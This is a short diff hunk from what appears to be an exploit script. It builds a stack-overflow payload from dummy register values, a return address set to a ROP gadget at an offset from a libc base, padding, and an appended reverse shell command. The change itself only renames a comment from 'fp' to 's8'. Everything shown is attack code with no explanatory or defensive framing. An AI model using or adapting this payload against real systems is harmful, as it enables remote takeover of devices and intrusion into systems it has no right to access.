@@ -59,7 +59,7 @@ def attack():
     payload_body += p32(0x55555555) # s5 dummy
     payload_body += p32(0x66666666) # s6 dummy
     payload_body += p32(0x77777777) # s7 dummy
-    payload_body += p32(0x88888888) # fp dummy
+    payload_body += p32(0x88888888) # s8 dummy
     payload_body += p32(libc_base + 0x000378d4)  # ra (ROP gadget)
     payload_body += b'b' * (0x120)  # padding
     payload_body += cmd  # Reverse Shell
